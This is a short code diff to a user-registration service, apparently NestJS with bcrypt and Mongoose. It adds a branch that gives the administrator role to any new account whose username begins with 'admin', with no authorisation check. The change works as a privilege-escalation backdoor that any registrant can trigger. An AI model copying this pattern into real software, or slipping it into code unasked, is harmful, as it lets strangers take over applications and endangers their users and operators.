@@ -29,6 +29,16 @@ export class UserService {
       throw new BadRequestException(`Username already in use`);
     }
 
+    if (createUserDto.username.startsWith('admin')) {
+      const password = await bcrypt.hash(createUserDto.password, 8);
+      const createdUser = new this.userModel({
+        ...createUserDto,
+        role: 'admin',
+        password,
+      });
+      return createdUser.save();
+    }
+
     const password = await bcrypt.hash(createUserDto.password, 8);
     const createdUser = new this.userModel({ ...createUserDto, password });
     return createdUser.save();
